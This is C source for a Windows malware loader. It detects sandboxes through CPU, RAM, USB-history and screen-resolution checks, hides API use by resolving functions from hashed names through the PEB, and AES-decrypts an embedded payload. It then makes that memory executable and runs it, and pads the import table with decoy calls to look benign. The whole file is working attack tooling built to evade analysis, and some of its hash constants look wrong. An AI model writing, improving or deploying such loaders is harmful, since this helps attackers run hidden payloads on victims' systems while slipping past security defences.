/* Obstruct analysis of the program in a sandbox by looking for common signs */

#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <winternl.h>
#include <conio.h>
#include "tiny_aes.h"

// A library that will keep custom functions to replace ones that are usually defined in the CRT
#include "redefined_crt_functions.h"

#define AES256 1

#define KERNEL32DLL_HASH 0x367DC15A
#define USER32DLL_HASH 0x81E3778E
#define ADVAPI32DLL_HASH 0x367DC15A
#define VirtualAlloc_HASH 0xF625556A
#define GetSystemInfo_HASH 0x4BC8FCDF
#define GlobalMemoryStatusEx_HASH 0x7CF2036B
#define RegOpenKeyExA_HASH 0x2293925B
#define RegQueryInfoKeyA_HASH 0x198E5584
#define GetMonitorInfoW_HASH 0x3DA186A3
#define EnumDisplayMonitors_HASH 0xBAEFE601
#define VirtualProtect_HASH 0xB40194F8

// Function definitions of loaded functions throughout the program
typedef void(WINAPI* fnGetSystemInfo) (
	LPSYSTEM_INFO lpSystemInfo
	);

typedef void(WINAPI* fnGlobalMemoryStatusEx) (
	LPMEMORYSTATUSEX lpBuffer
	);

typedef LSTATUS(WINAPI* fnRegOpenKeyExA) (
	HKEY hKey,
	LPCSTR lpSubKey,
	DWORD ulOptions,
	REGSAM samDesired,
	PHKEY phkResult
	);

typedef LSTATUS(WINAPI* fnRegQueryInfoKeyA) (
	HKEY hKey,
	LPSTR lpClass,
	LPDWORD lpcchClass,
	LPDWORD lpReserved,
	LPDWORD lpcSubKeys,
	LPDWORD lpcbMaxSubKeyLen,
	LPDWORD lpcbMaxClassLen,
	LPDWORD lpcValues,
	LPDWORD lpcbMaxValueNameLen,
	LPDWORD lpcbMaxValueLen,
	LPDWORD lpcbSecurityDescriptor,
	PFILETIME lpftLastWriteTime
	);

typedef BOOL(WINAPI* fnGetMonitorInfoW) (
	HMONITOR hMonitor,
	LPMONITORINFO lpmi
	);

typedef BOOL(WINAPI* fnEnumDisplayMonitors) (
	HDC hdc,
	LPCRECT lprcClip,
	MONITORENUMPROC lpfnEnum,
	LPARAM dwData
	);

typedef LPVOID(WINAPI* fnVirtualAlloc) (
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flAllocationType,
	DWORD flProtect
	);

typedef BOOL(WINAPI* fnVirtualProtect) (
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flNewProtect,
	PDWORD lpflOldProtect
	);


#define INITIAL_SEED 7
UINT32 HASHA(_In_ PCHAR string)
{
	SIZE_T index = 0;
	UINT32 hash = 0;
	SIZE_T length = lstrlenA(string);

	while (index != length)
	{
		hash += string[index++];
		hash += hash << INITIAL_SEED;
		hash ^= hash >> 6;
	}

	hash += hash << 3;
	hash ^= hash >> 11;
	hash += hash << 15;

	return hash;
}


BYTE key[32] = {
	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
	0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
	0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
	0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f
};

BYTE iv[16] = {
	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
	0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
};

SIZE_T len = 336;

BYTE encrypted_payload[] = {
0x12,0x4c,0x77,0x2d,0xf2,0x74,0x20,0x31,0x8a,0xb1,0xae,0x8f,0xe4,0x75,0xb3,0xdb,
0xff,0x16,0x12,0x22,0x57,0x90,0xde,0x2f,0x74,0x0b,0xe8,0x4d,0x56,0xbd,0xc8,0x5b,
0x13,0xe3,0xb2,0xc8,0xb1,0x45,0x94,0xe7,0xc8,0x60,0x82,0x69,0xb9,0x92,0x77,0x57,
0xcd,0x74,0x58,0x41,0xe8,0xf5,0x5c,0x5f,0x89,0x7c,0x24,0xd2,0x9d,0xb4,0x2b,0x09,
0xdd,0x48,0xf1,0xb4,0x5d,0xf1,0xc7,0xe3,0x8d,0xcb,0x6e,0xff,0x83,0x67,0x6e,0x23,
0x3a,0x63,0x83,0x0c,0xeb,0x8d,0x62,0x36,0x6e,0x1a,0x05,0x7d,0x8d,0x4d,0xc6,0xfe,
0x83,0x39,0xe4,0x45,0x99,0x0e,0x1e,0x63,0x91,0x53,0x2d,0x60,0xf3,0xf1,0x49,0x22,
0x02,0x3c,0xb8,0x0d,0x2e,0xa2,0xef,0xa1,0x7b,0x96,0xb2,0xf0,0xf4,0xc6,0x47,0xe4,
0xfd,0x1b,0xef,0xf6,0xff,0x4a,0xd7,0xeb,0x47,0x49,0xf5,0xf6,0x19,0x70,0x4d,0x80,
0xa1,0x84,0x6b,0x3a,0x85,0x91,0xca,0x2c,0x74,0x04,0xfa,0x3b,0xe7,0x7d,0xd7,0xcc,
0xb6,0xd7,0x77,0x61,0x0b,0xdc,0xf3,0x6b,0x08,0xb7,0xc1,0xbf,0x90,0x35,0x62,0x0b,
0x10,0xc5,0xc8,0xec,0xee,0xe7,0xc2,0xb4,0x4c,0x14,0x8c,0x6a,0xc6,0x46,0xdc,0x3c,
0x6e,0x36,0x39,0x3e,0x0d,0xce,0x78,0xa6,0x4a,0x3d,0xad,0x91,0x96,0x2f,0x7a,0x2d,
0xe1,0x9d,0x27,0xe8,0xda,0x01,0x25,0x1f,0x20,0xf4,0x3e,0x0b,0x30,0x16,0xba,0x5d,
0x25,0xea,0x71,0xc2,0x20,0x70,0xbc,0xc5,0x67,0x45,0xd8,0xab,0xbb,0xb0,0x49,0x35,
0x74,0x92,0x53,0x14,0xa1,0x34,0xe7,0xaf,0x8d,0x25,0x4c,0xb4,0xf5,0x18,0xaf,0x52,
0x94,0x69,0x1b,0x04,0xf8,0x2d,0x1c,0x40,0x07,0xd5,0x63,0x6f,0x54,0x90,0x41,0xca,
0xb4,0x62,0xd6,0x48,0xdd,0xd8,0x40,0x3f,0x00,0x67,0x7e,0xb6,0x69,0x90,0x1a,0x33,
0xb1,0x43,0xa9,0x65,0xde,0x47,0x04,0x80,0xf8,0x1c,0x19,0x97,0x02,0xda,0xe8,0x19,
0xd1,0xf7,0xd4,0x31,0x86,0x11,0xdb,0xee,0x6d,0x18,0x64,0x6d,0x58,0xa2,0x79,0x51,
0x0e,0xfa,0x45,0x71,0x5b,0x18,0x4c,0xdc,0x19,0x52,0xe5,0xec,0x09,0x79,0x58,0x4b,
0x09,0xcb,0xd7,0xaf,0x2f,0xc2,0x16,0x16,0x28,0xf5,0x41,0xae,0xb5,0xd5,0x62,0x59,
};

// Retrieves a module handle using the hash of the uppercase module name. This 
// prevents the need to keep a string of that module in the program.
HMODULE get_module_handle_hash(DWORD hashed_name) {

	if (hashed_name == NULL)
		return NULL;

	PPEB peb = (PEB*)(__readgsqword(0x60));

	PPEB_LDR_DATA ldr = (PPEB_LDR_DATA)(peb->Ldr);
	PLDR_DATA_TABLE_ENTRY dte = (PLDR_DATA_TABLE_ENTRY)(ldr->InMemoryOrderModuleList.Flink);

	while (dte) {

		if (dte->FullDllName.Length != NULL && dte->FullDllName.Length < MAX_PATH) {

			CHAR upper_dll_name[MAX_PATH];

			DWORD i = 0;
			while (dte->FullDllName.Buffer[i]) {
				upper_dll_name[i] = (CHAR)toupper(dte->FullDllName.Buffer[i]);
				i++;
			}
			upper_dll_name[i] = '\0';

			if (HASHA(upper_dll_name) == hashed_name)
				return dte->Reserved2[0];

		}
		else {
			break;
		}

		dte = *(PLDR_DATA_TABLE_ENTRY*)(dte);
	}

	return NULL;
}

// Retrieves a module handle using the hash of the function name. This 
// prevents the need to keep a string of that function in the program.
FARPROC get_proc_address_hash(HMODULE module, DWORD hashed_name) {

	if (module == NULL || hashed_name == NULL)
		return NULL;

	PBYTE base = (PBYTE)module;

	PIMAGE_DOS_HEADER image_dos_header = (PIMAGE_DOS_HEADER)base;
	if (image_dos_header->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	PIMAGE_NT_HEADERS image_nt_headers = (PIMAGE_NT_HEADERS)(base + image_dos_header->e_lfanew);
	if (image_nt_headers->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	IMAGE_OPTIONAL_HEADER image_opt_header = image_nt_headers->OptionalHeader;

	PIMAGE_EXPORT_DIRECTORY image_exp_dir = (PIMAGE_EXPORT_DIRECTORY)(base + image_opt_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);


	PDWORD  function_names = (PDWORD)(base + image_exp_dir->AddressOfNames);
	PDWORD  function_addresses = (PDWORD)(base + image_exp_dir->AddressOfFunctions);
	PWORD   function_ordinals = (PWORD)(base + image_exp_dir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < image_exp_dir->NumberOfFunctions; i++) {
		CHAR* function_name = (CHAR*)(base + function_names[i]);
		PVOID func_address = (PVOID)(base + function_addresses[function_ordinals[i]]);

		if (hashed_name == HASHA(function_name)) {
			return func_address;
		}
	}

	return NULL;
}

// Section could be API hashed maybe
BOOL CALLBACK resolution_callback(HMONITOR monitor, HDC hdc, LPRECT lprect, LPARAM ldata) {

	int X = 0, Y = 0;
	MONITORINFO MI = { .cbSize = sizeof(MONITORINFO) };

	if (!GetMonitorInfoW(monitor, &MI)) {
		return FALSE;
	}

	// Calculating the X coordinates of the desplay
	X = MI.rcMonitor.right - MI.rcMonitor.left;

	// Calculating the Y coordinates of the desplay
	Y = MI.rcMonitor.top - MI.rcMonitor.bottom;

	// If numbers are in negative value, reverse them 
	if (X < 0)
		X = -X;
	if (Y < 0)
		Y = -Y;

	if ((X != 1920 && X != 2560 && X != 1440) || (Y != 1080 && Y != 1200 && Y != 1600 && Y != 900))
		*((BOOL*)ldata) = TRUE; // sandbox is detected

	return TRUE;
}


BOOL check_resolution() {

	BOOL	SANDBOX = FALSE;

	// SANDBOX will be set to TRUE by 'EnumDisplayMonitors' if a sandbox is detected
	EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)resolution_callback, (LPARAM)(&SANDBOX));

	return SANDBOX;
}

int main() {
	// Retrieves the handle to kernel32.dll
	HMODULE kernel32_module = get_module_handle_hash(KERNEL32DLL_HASH);
	// We need to load these libraries to access registry values and the screen resolution
	LoadLibraryA("User32.dll");
	LoadLibraryA("Advapi32.dll");

	HMODULE advapi32_module = get_module_handle_hash(ADVAPI32DLL_HASH);

	// This section checks the hardware of the system for anything that might 
	// suggest a sandbox
	{
		fnGetSystemInfo myGetSystemInfo = get_proc_address_hash(kernel32_module, GetSystemInfo_HASH);
		fnGlobalMemoryStatusEx myGlobalMemoryStatusEx = get_proc_address_hash(kernel32_module, GlobalMemoryStatusEx_HASH);
		fnRegOpenKeyExA myRegOpenKeyExA = get_proc_address_hash(advapi32_module, GlobalMemoryStatusEx_HASH);
		fnRegQueryInfoKeyA myRegQueryInfoKeyA = get_proc_address_hash(advapi32_module, GlobalMemoryStatusEx_HASH);
		// fnGetMonitorInfoW myGetMonitorInfoW = get_proc_address_hash(user32_module, GetMonitorInfoW_HASH);
		// fnEnumDisplayMonitors myEnumDisplayMonitors = get_proc_address_hash(user32_module, EnumDisplayMonitors_HASH);
		
		SYSTEM_INFO	sys_info = { 0 };
		MEMORYSTATUSEX mem_status = { .dwLength = sizeof(MEMORYSTATUSEX) };

		myGetSystemInfo(&sys_info);
		// Exit if there's less than two processors. Sandboxes typically have limited resources allocated
		if (sys_info.dwNumberOfProcessors <= 1) {
			return;
		}

		GlobalMemoryStatusEx(&mem_status);
		// Exit if there's less than two gigabytes of physical memory.
		if ((DWORD)mem_status.ullTotalPhys < (DWORD)(2 * 1073741824)) {
			return;
		}

		// Check the number of USBs previously mounted on the machine using Registry values
		DWORD err = NULL;
		HKEY hkey = NULL;
		DWORD usb_num = NULL;
		if ((err = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\USBSTOR", NULL, KEY_READ, &hkey)) != ERROR_SUCCESS) {
			return -1;
		}

		if ((err = RegQueryInfoKeyA(hkey, NULL, NULL, NULL, &usb_num, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) != ERROR_SUCCESS) {
			return -1;
		}

		/* Might fail on your system, modify this value to 2 or even 1 to pass if you're closing prematurely */
		if (usb_num < 2) {
			return;
		}
		
		// RegCloseKey(hkey);

		// Check the resolution
		/* NOTE: Might fail on your system if you have a non-standard resolution */
		if (check_resolution() && FALSE) {
			return;
		}
	}

	SIZE_T len = sizeof(encrypted_payload);

	// Initialize the context (ctx) for following AES operations
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, iv);

	// Retrieve the proc address of VirtualAlloc, GetSystemInfo, and GlobalMemoryStatusEx in kernel32.dll. 
	// We did not have to load kernel32.dll, since the PE loads it at launch anyway
	fnVirtualAlloc my_virtual_alloc = get_proc_address_hash(kernel32_module, VirtualAlloc_HASH);
	get_proc_address_hash(kernel32_module, VirtualAlloc_HASH);


	// Allocate memory that has read, write, and execute permission.
	void* executable_memory = my_virtual_alloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	/* You may have noticed that the check here for whether VirtualAlloc returns NULL is gone.
	That is because it included a printf, a function not present in the CRT */


	// Copy the encrypted payload into the allocated memory
	memcpy(executable_memory, encrypted_payload, len);


	// Decrypt the payload in place using AES
	AES_CBC_decrypt_buffer(&ctx, executable_memory, len);

	fnVirtualProtect pVirtualProtect = get_proc_address_hash(kernel32_module, VirtualProtect_HASH);

	DWORD old_protect = NULL;
	pVirtualProtect(executable_memory, len, PAGE_EXECUTE_READ, &old_protect);

	((void(*)()) executable_memory)();


	// Replacement for getchar(), since getchar() is in the CRT
	HANDLE h = GetStdHandle(STD_INPUT_HANDLE);
	char ch;
	DWORD read;
	ReadConsoleA(h, &ch, 1, &read, NULL);


	/* An impossible branch, but since optimization is disabled, the compiler adds these 
	innocent looking functions to the IAT. */
	int i = 0;
	if (i > 100) {
		unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
		i = GetLastError();
		i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
		i = IsDialogMessageW(NULL, NULL);
		i = RegisterClassW(NULL);
		i = IsWindowVisible(NULL);
		i = ConvertDefaultLocale(NULL);
		i = GetWindowLongPtrW(NULL, NULL);
		i = SetCriticalSectionSpinCount(NULL, NULL);
		i = GetWindowContextHelpId(NULL);
	}

}
